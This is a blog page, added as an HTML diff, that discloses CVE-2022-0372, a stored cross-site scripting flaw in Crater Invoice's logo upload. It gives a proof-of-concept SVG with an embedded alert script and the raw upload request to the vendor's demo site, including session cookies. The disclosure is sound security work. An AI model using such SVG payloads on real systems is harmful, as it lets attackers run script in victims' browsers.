@@ -1,0 +1,296 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    
+      <title>
+        CVE-2022-0372 - XSS Crater-Invoice ::
+        1d8 blog — A simple theme for Hugo
+      </title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta
+  name="description"
+  content="Description #  There is a vulnerability in the upload avatar functionality of crater invoice which would allow an attacker to upload malicious .SVG files in order to execute Javascript. All that is required is that the victim browse to the link location of the .SVG file Proof of Concept
+Proof of Concept #  xss.svg:
+&amp;lt;?xml version=&amp;#34;1.0&amp;#34; standalone=&amp;#34;no&amp;#34;?&amp;gt; &amp;lt;!DOCTYPE svg PUBLIC &amp;#34;-//W3C//DTD SVG 1.1//EN&amp;#34; &amp;#34;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&amp;#34;&amp;gt; &amp;lt;svg version=&amp;#34;1.1&amp;#34; baseProfile=&amp;#34;full&amp;#34; xmlns=&amp;#34;http://www.w3.org/2000/svg&amp;#34;&amp;gt; &amp;lt;polygon id=&amp;#34;triangle&amp;#34; points=&amp;#34;0,0 0,50 50,0&amp;#34; fill=&amp;#34;#009900&amp;#34; stroke=&amp;#34;#004400&amp;#34;/&amp;gt; &amp;lt;script type=&amp;#34;text/javascript&amp;#34;&amp;gt; alert(&amp;#34;svg xss&amp;#34;); &amp;lt;/script&amp;gt; &amp;lt;/svg&amp;gt; Request:"
+/>
+<meta
+  name="keywords"
+  content=""
+/>
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="https://1d8.github.io/cves/cve_2022_0372/" />
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/style.css" />
+
+<link rel="stylesheet" href="https://1d8.github.io/style.css" />
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://1d8.github.io/img/apple-touch-icon-144-precomposed.png" />
+<link rel="shortcut icon" href="https://1d8.github.io/img/favicon.png" />
+
+
+<link href="/fonts/Inter-Italic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/fonts/Inter-Regular.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/fonts/Inter-Medium.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/fonts/Inter-MediumItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/fonts/Inter-Bold.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+<link href="/fonts/Inter-BoldItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="CVE-2022-0372 - XSS Crater-Invoice"/>
+<meta name="twitter:description" content="Description #  There is a vulnerability in the upload avatar functionality of crater invoice which would allow an attacker to upload malicious .SVG files in order to execute Javascript. All that is required is that the victim browse to the link location of the .SVG file Proof of Concept
+Proof of Concept #  xss.svg:
+&lt;?xml version=&#34;1.0&#34; standalone=&#34;no&#34;?&gt; &lt;!DOCTYPE svg PUBLIC &#34;-//W3C//DTD SVG 1.1//EN&#34; &#34;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&#34;&gt; &lt;svg version=&#34;1.1&#34; baseProfile=&#34;full&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt; &lt;polygon id=&#34;triangle&#34; points=&#34;0,0 0,50 50,0&#34; fill=&#34;#009900&#34; stroke=&#34;#004400&#34;/&gt; &lt;script type=&#34;text/javascript&#34;&gt; alert(&#34;svg xss&#34;); &lt;/script&gt; &lt;/svg&gt; Request:"/>
+
+
+
+<meta property="og:title" content="CVE-2022-0372 - XSS Crater-Invoice" />
+<meta property="og:description" content="Description #  There is a vulnerability in the upload avatar functionality of crater invoice which would allow an attacker to upload malicious .SVG files in order to execute Javascript. All that is required is that the victim browse to the link location of the .SVG file Proof of Concept
+Proof of Concept #  xss.svg:
+&lt;?xml version=&#34;1.0&#34; standalone=&#34;no&#34;?&gt; &lt;!DOCTYPE svg PUBLIC &#34;-//W3C//DTD SVG 1.1//EN&#34; &#34;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&#34;&gt; &lt;svg version=&#34;1.1&#34; baseProfile=&#34;full&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt; &lt;polygon id=&#34;triangle&#34; points=&#34;0,0 0,50 50,0&#34; fill=&#34;#009900&#34; stroke=&#34;#004400&#34;/&gt; &lt;script type=&#34;text/javascript&#34;&gt; alert(&#34;svg xss&#34;); &lt;/script&gt; &lt;/svg&gt; Request:" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://1d8.github.io/cves/cve_2022_0372/" /><meta property="article:section" content="cves" />
+
+<meta property="og:site_name" content="1d8 blog" />
+
+
+
+
+
+
+
+  </head>
+  <body class="dark-theme">
+    <div class="container">
+      <header class="header">
+  <span class="header__inner">
+    <a
+  href="/"
+  class="logo"
+  style="text-decoration: none;"
+>
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
+</svg>
+</span>
+    <span class="logo__text"
+      >1d8 blog</span
+    >
+    <span class="logo__cursor"></span>
+  
+</a>
+
+    <span class="header__right">
+      
+        <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="/cves">CVEs</a></li>
+        
+      
+        
+          <li><a href="/publications">Publications</a></li>
+        
+      
+        
+          <li><a href="/writeups">Writeups</a></li>
+        
+      
+      
+      
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/about">About</a></li>
+      
+    
+      
+        <li><a href="/cves">CVEs</a></li>
+      
+    
+      
+        <li><a href="/publications">Publications</a></li>
+      
+    
+      
+        <li><a href="/writeups">Writeups</a></li>
+      
+    
+  </ul>
+</nav>
+
+        <span class="menu-trigger">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M0 0h24v24H0z" fill="none" />
+            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z" />
+          </svg>
+        </span>
+      
+      <span class="theme-toggle">
+        <svg
+  class="theme-toggler"
+  width="24"
+  height="24"
+  viewBox="0 0 48 48"
+  fill="none"
+  xmlns="http://www.w3.org/2000/svg"
+>
+  <path
+    d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"
+  />
+</svg>
+
+      </span>
+    </span>
+  </span>
+</header>
+
+
+      <div class="content">
+        
+  
+  
+
+  <article class="post">
+    <h1 class="post-title">CVE-2022-0372 - XSS Crater-Invoice</h1>
+    <div class="post-meta">
+      
+
+      
+
+
+      
+        <span class="post-read-time"
+          >— 1 min read</span
+        >
+      
+    </div>
+
+    
+
+    
+
+    <div class="post-content">
+      
+      <h1 id="description">
+  Description
+  <a href="#description" class="h-anchor" aria-hidden="true">#</a>
+</h1>
+<p>There is a vulnerability in the upload avatar functionality of crater invoice which would allow an attacker to upload malicious .SVG files in order to execute Javascript. All that is required is that the victim browse to the link location of the .SVG file
+Proof of Concept</p>
+<h1 id="proof-of-concept">
+  Proof of Concept
+  <a href="#proof-of-concept" class="h-anchor" aria-hidden="true">#</a>
+</h1>
+<p><strong>xss.svg:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; standalone=&#34;no&#34;?&gt;</span>
+<span style="color:#75715e">&lt;!DOCTYPE svg PUBLIC &#34;-//W3C//DTD SVG 1.1//EN&#34; &#34;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&#34;&gt;</span>
+<span style="color:#f92672">&lt;svg</span> <span style="color:#a6e22e">version=</span><span style="color:#e6db74">&#34;1.1&#34;</span> <span style="color:#a6e22e">baseProfile=</span><span style="color:#e6db74">&#34;full&#34;</span> <span style="color:#a6e22e">xmlns=</span><span style="color:#e6db74">&#34;http://www.w3.org/2000/svg&#34;</span><span style="color:#f92672">&gt;</span>
+   <span style="color:#f92672">&lt;polygon</span> <span style="color:#a6e22e">id=</span><span style="color:#e6db74">&#34;triangle&#34;</span> <span style="color:#a6e22e">points=</span><span style="color:#e6db74">&#34;0,0 0,50 50,0&#34;</span> <span style="color:#a6e22e">fill=</span><span style="color:#e6db74">&#34;#009900&#34;</span> <span style="color:#a6e22e">stroke=</span><span style="color:#e6db74">&#34;#004400&#34;</span><span style="color:#f92672">/&gt;</span>
+   <span style="color:#f92672">&lt;script</span> <span style="color:#a6e22e">type=</span><span style="color:#e6db74">&#34;text/javascript&#34;</span><span style="color:#f92672">&gt;</span>
+      alert(&#34;svg xss&#34;);
+   <span style="color:#f92672">&lt;/script&gt;</span>
+<span style="color:#f92672">&lt;/svg&gt;</span>
+</code></pre></div><p><strong>Request:</strong></p>
+<pre tabindex="0"><code>POST /api/v1/company/upload-logo HTTP/1.1
+Host: demo.craterapp.com
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+X-Requested-With: XMLHttpRequest
+company: 2
+X-XSRF-TOKEN: eyJpdiI6IldPbm1zN2h1QXM5MStpL3ZlNms5N0E9PSIsInZhbHVlIjoiSFk2RGMweXA4VSs3bFFocmFXN3ByTFB0a0lpb1ZTWWZ6dEdQUEVYdXpBTXlhV29CRy9FTlZoOUJ6WmFXZkt0eDh4OXdmTVB0eGV0Y0lNTTlSM2FmU1crMFVqUjFNL3FGQS8rbWsrUEtDcHhyTG8wVEw0V2pKSnVYamYxUmRycjEiLCJtYWMiOiJjYTM0NTEzYTQ4ZjNmNGVhNTZmYjg2ZmE4OGQ1NDMwNzFmZDQxMDA1Y2Y1ZGQxYzQ3MGQ0MzE0ODE3M2FmOTQyIiwidGFnIjoiIn0=
+Content-Type: multipart/form-data; boundary=---------------------------202251926415456929271193356967
+Content-Length: 735
+Origin: https://demo.craterapp.com
+DNT: 1
+Connection: keep-alive
+Referer: https://demo.craterapp.com/admin/settings/company-info
+Cookie: __stripe_mid=7d4c8a79-b568-4a3b-a898-67c90bb47968edd571; __stripe_sid=1cf6fd84-0a75-41ee-af21-ad527c27e72ce39a5c; XSRF-TOKEN=eyJpdiI6IldPbm1zN2h1QXM5MStpL3ZlNms5N0E9PSIsInZhbHVlIjoiSFk2RGMweXA4VSs3bFFocmFXN3ByTFB0a0lpb1ZTWWZ6dEdQUEVYdXpBTXlhV29CRy9FTlZoOUJ6WmFXZkt0eDh4OXdmTVB0eGV0Y0lNTTlSM2FmU1crMFVqUjFNL3FGQS8rbWsrUEtDcHhyTG8wVEw0V2pKSnVYamYxUmRycjEiLCJtYWMiOiJjYTM0NTEzYTQ4ZjNmNGVhNTZmYjg2ZmE4OGQ1NDMwNzFmZDQxMDA1Y2Y1ZGQxYzQ3MGQ0MzE0ODE3M2FmOTQyIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6IlJaTTJTc0E3eVZWWXhjT3BZYnJlSnc9PSIsInZhbHVlIjoiTU5jaFY5MTk4SWRRZEZYMC8zSDkxZDhLMHp0NklPU1RtQUE3dEkwRzByMGVVY3BBSG1TeUI5ZkhKRGJsWHhybThEeFNjREdyd295UmVBV0h1dVAzb3Z6U3JiZ0ErNUtPTnRYMlpBNnJXR0lWN2JObGtDKzJ0MVRMaDVpSzlKOFQiLCJtYWMiOiIxYTc1YmM3OWZiYTM4OTA3ZWIwZWU5NzA5NGIxYzRkMGM2MGJlNTI0NjcyZGQ3ZWVjNWIyMTQzMTFhOGY5NjY4IiwidGFnIjoiIn0%3D; kQ8ZSOBtOqtWUFzuaiCYX7I5LKHRDCE3lwldiGew=eyJpdiI6IkQ3VE5lWjlINkU3Y1ZvUktSdkhSS1E9PSIsInZhbHVlIjoiSFBCcDNsYVd3K3JIL3BhVWRHUWs3THBmVEl1MWtOYmo4VzUrT2p2azhzV3ZoY2lWcUk0KzlXZWJOK3ZLbUtML3N6SGxXV3FjeGU1c0lvcGwrYnlMWTByNk9mbWcrcjlSd2VtNTVZcUtiTDJvb0pyUDhmdlJZUXc3cjlJOHMzZEJscXVWZGJzRmJyRzhNcEpENnNGOWxEK3d3S200OG5hd3duZ2tCazRZaDBVUWkvZlgxaWtoNC9HenlTb2QyVmlnY2pIUSt4bmw0YnkzWGNibjNKcWxkY1B3RzV3c0pHYURnNDJMRXBkUHFrWDEvQkdORkYzK0xXTVVoSEx3YldWN0J2ZEJkTytSWU1tR0VVUFhheTVMek1XWStiZnFrZTArU0pMUFhEWE8yZStkRkpzWS9oM1hsTk00L01mY2tWSko4NFdZcUtBRlo0N0QvMWZBZmR3bVRRU29zRXJyM3RZdmpDRGE4MG9EelR2eUQzZThQK1R2dDc0dEJoMmE2OTZMT3h1eWhZdXN3bkhjVTFrTThXTStPdzhtemkzMEdKdXRoTC96RXFtSzh3MEZJanFGRjI3bGpMN3hyTllrQjk5UFdpdUNiY3ZzQThyUjF3enVvZHpkc3p3TCt3eDJnQmxvUjZQWXNmRC9aWGdQMk0rcENPNmNaaTVEbk9QWit4bitGOENKRWpSSTR2UllXZFpuYUhEQmpidE40ZXFwZHVsYkMwbk84eDBGVzVSR2w4S0pXNDgwZUU2UjJpL0tIb2ZnIiwibWFjIjoiNDRmMDY0MjE5ZTNmNmE3ZGQ5Yzg2N2U1ZTYyZDk2MzU2YWQ3YTg1MDE2Y2FlYzcyN2MyNGZlODdjYmY4ZjFiMSIsInRhZyI6IiJ9
+Sec-GPC: 1
+
+-----------------------------202251926415456929271193356967
+Content-Disposition: form-data; name=&quot;company_logo&quot;
+
+{&quot;name&quot;:&quot;xss.svg&quot;,&quot;data&quot;:&quot;data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBzdGFuZGFsb25lPSJubyI/Pgo8IURPQ1RZUEUgc3ZnIFBVQkxJQyAiLS8vVzNDLy9EVEQgU1ZHIDEuMS8vRU4iICJodHRwOi8vd3d3LnczLm9yZy9HcmFwaGljcy9TVkcvMS4xL0RURC9zdmcxMS5kdGQiPgo8c3ZnIHZlcnNpb249IjEuMSIgYmFzZVByb2ZpbGU9ImZ1bGwiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CiAgIDxwb2x5Z29uIGlkPSJ0cmlhbmdsZSIgcG9pbnRzPSIwLDAgMCw1MCA1MCwwIiBmaWxsPSIjMDA5OTAwIiBzdHJva2U9IiMwMDQ0MDAiLz4KICAgPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPgogICAgICBhbGVydCgic3ZnIHhzcyIpOwogICA8L3NjcmlwdD4KPC9zdmc+Cg==&quot;}
+-----------------------------202251926415456929271193356967--
+</code></pre><p><strong>Response:</strong></p>
+<p><code>{&quot;success&quot;:true}</code></p>
+<h1 id="reference---httpshuntrdevbounties563232b9-5a93-4f4d-8389-ed805b262ef1">
+  Reference - <a href="https://huntr.dev/bounties/563232b9-5a93-4f4d-8389-ed805b262ef1/">https://huntr.dev/bounties/563232b9-5a93-4f4d-8389-ed805b262ef1/</a>
+  <a href="#reference---httpshuntrdevbounties563232b9-5a93-4f4d-8389-ed805b262ef1" class="h-anchor" aria-hidden="true">#</a>
+</h1>
+
+    </div>
+    
+
+    
+      
+    
+  </article>
+
+      </div>
+
+      
+        <footer class="footer">
+  <div class="footer__inner">
+    
+      <a
+  href="/"
+  class="logo"
+  style="text-decoration: none;"
+>
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
+</svg>
+</span>
+    <span class="logo__text"
+      >1d8 blog</span
+    >
+    <span class="logo__cursor"></span>
+  
+</a>
+
+      <div class="copyright">
+        <span>© 2023 Powered by <a href="https://gohugo.io" target="_blank" rel="noopener">Hugo</a></span>
+        <span><a href="https://github.com/panr/hugo-theme-hello-friend" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
+      </div>
+    
+  </div>
+</footer>
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+      
+    </div>
+
+    
+  </body>
+</html>
